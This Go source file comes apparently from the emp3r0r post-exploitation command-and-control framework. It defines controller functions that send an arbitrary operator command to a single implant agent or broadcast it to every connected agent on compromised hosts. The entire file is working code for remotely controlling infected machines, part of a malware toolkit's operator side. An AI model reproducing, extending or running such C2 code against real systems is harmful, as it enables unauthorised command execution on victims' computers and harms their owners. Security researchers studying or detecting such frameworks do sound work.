package controllers

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// ExecuteRawCommand sends a raw command to one target or all connected targets.
func ExecuteRawCommand(ctx *c2context.C2Context) {
	execOnTarget := func(agentTag string) {
		cmdOpt, ok := ctx.Flags["cmd_to_exec"]
		if !ok {
			logging.Errorf("Option 'cmd_to_exec' not found")
			return
		}
		jobID := ""
		if ctx.Job != nil {
			jobID = ctx.Job.ID
		}
		err := ExecuteCommand(cmdOpt, jobID, agentTag)
		if err != nil {
			logging.Errorf("ExecuteCommand: %v", err)
		}
	}

	if ctx.Target == nil {
		cmdOpt, ok := ctx.Flags["cmd_to_exec"]
		if !ok {
			logging.Errorf("Option 'cmd_to_exec' not found")
			return
		}
		connected := agents.GetConnectedAgents()
		if len(connected) == 0 {
			logging.Errorf("No connected agents")
			return
		}
		logging.Warningf("emp3r0r will execute `%s` on all targets this time", cmdOpt)
		for _, target := range connected {
			execOnTarget(target.Tag)
		}
		return
	}

	execOnTarget(ctx.Target.Tag)
}

// ExecuteAgentCommand sends one command to one agent.
func ExecuteAgentCommand(agent *def.Emp3r0rAgent, cmd string, _ string) error {
	if agent == nil {
		return fmt.Errorf("no agent specified")
	}
	if agent.Tag == "" {
		return fmt.Errorf("agent tag is empty")
	}
	return ExecuteCommand(cmd, "", agent.Tag)
}
